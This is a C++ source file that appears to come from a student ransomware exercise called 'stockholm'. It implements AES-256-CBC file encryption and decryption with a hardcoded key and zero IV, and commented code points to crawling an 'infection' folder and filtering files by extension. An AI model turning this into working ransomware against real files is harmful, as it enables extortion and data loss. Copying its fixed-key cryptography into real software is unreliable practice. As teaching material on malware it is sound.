#include "Crawler.hpp"
#include "stockholm.hpp"
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>
#include "aes.hpp"

void EncryptFile(fs::path p)
{
	fs::path enc_p;
	enc_p.assign(p);
	enc_p.replace_extension(std::string(p.extension()).append(".ft"));

	std::ifstream file(p, std::ios::in | std::ios::binary);
	std::ofstream enc_file(enc_p, std::ios::out | std::ios::binary | std::ios::trunc);
	if (!file.is_open())
	{
		std::cerr << "Failed to open file " << p << "." << std::endl;
		return;
	}
	if (!enc_file.is_open())
	{
		std::cerr << "Failed to open encrypted file " << p << "." << std::endl;
		return;
	}

	AES_256_CBC cipher = AES_256_CBC((uint8_t[]){0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31},
									 (uint8_t *)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
									 AES_256_CBC::EncryptionMode);
	char in[1024];
	unsigned char out[1024 + EVP_MAX_BLOCK_LENGTH];
	int outl;
	cipher.Init();
	do
	{
		file.read(in, 1024);
		std::streamsize size = file.gcount();
		cipher.Encrypt((unsigned char *)in, (int)size, out, &outl);
		enc_file.write((char *)out, outl);
	} while (!file.eof());

	file.close();
	cipher.FinishEncryption(out, &outl);
	enc_file.write((char *)out, outl);
	enc_file.close();
}

void DecryptFile(fs::path p)
{
	fs::path dec_p;
	dec_p.assign(p);
	dec_p.replace_extension();

	std::ifstream file(p, std::ios::in | std::ios::binary);
	std::ofstream dec_file(dec_p, std::ios::out | std::ios::binary | std::ios::trunc);
	if (!file.is_open())
	{
		std::cerr << "Failed to open file " << p << "." << std::endl;
		return;
	}
	if (!dec_file.is_open())
	{
		std::cerr << "Failed to open decrypted file " << p << "." << std::endl;
		return;
	}

	AES_256_CBC cipher = AES_256_CBC((uint8_t[]){0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31},
									 (uint8_t *)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
									 AES_256_CBC::DecryptionMode);
	char in[1024];
	unsigned char out[1024 + EVP_MAX_BLOCK_LENGTH];
	int outl;
	cipher.Init();
	do
	{
		file.read(in, 1024);
		std::streamsize size = file.gcount();
		cipher.Decrypt((unsigned char *)in, (int)size, out, &outl);
		dec_file.write((char *)out, outl);
	} while (!file.eof());

	file.close();
	cipher.FinishDecryption(out, &outl);
	dec_file.write((char *)out, outl);
	dec_file.close();
}

// inline bool filter_extensions(std::string path)
// {
// 	for (size_t i = 0; i < stockholm::extensions_count; ++i)
// 	{
// 		if (path.ends_with(stockholm::extensions[i]))
// 			return true;
// 	}
// 	return false;
// }
// see https://docs.openssl.org/master/man3/EVP_EncryptInit/#examples

// int main(void)
// {
// 	// auto files = RetrieveFilesInInfectionDirectory();
// 	// std::list<std::string> filtered_files;
// 	// std::copy_if(files.begin(), files.end(), std::back_inserter(filtered_files), filter_extensions);
// 	// std::cout << filtered_files.size() << std::endl;
// 	// EncryptFile("/home/tblochet/infection/toto.txt");
// 	DecryptFile("/home/tblochet/infection/toto2.txt.ft");
// }
